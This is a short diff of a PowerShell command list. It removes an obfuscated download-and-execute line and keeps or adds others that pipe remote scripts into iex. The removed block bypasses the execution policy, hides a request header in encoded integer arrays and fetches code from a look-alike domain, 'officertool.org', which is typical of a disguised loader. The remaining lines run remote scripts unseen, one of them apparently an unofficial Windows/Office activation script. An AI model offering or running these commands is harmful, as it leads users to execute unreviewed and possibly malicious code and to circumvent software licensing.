@@ -1,9 +1,3 @@
-Run in default Windows Powershell
-
-[Net.ServicePointManager]::SecurityProtocol = "tls12"
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
-$Headers = @(-341,-461,-405,-457,-181,-261,-413,-405,-441,-465,-333,-277,-269,-341,-329,-277,-381,-309,-317,-273,-277)
-IWR -Uri "https://officertool.org/Download/GetLatest" -UseBasicParsing -UserAgent R_Tool_Agent -MaximumRedirection 2 -Method Get -Headers `
-@{-join(0..9|%{$Headers[$_]}|%{-bNot $_}|%{$_-shr 2}|%{$_-as[Char]})=-join(10..20|%{$Headers[$_]}|%{-bNot $_}|%{$_-shr 2}|%{$_-as[Char]})} | IEX
+irm https://officetool.plus | iex
 
 irm https://get.activated.win | iex
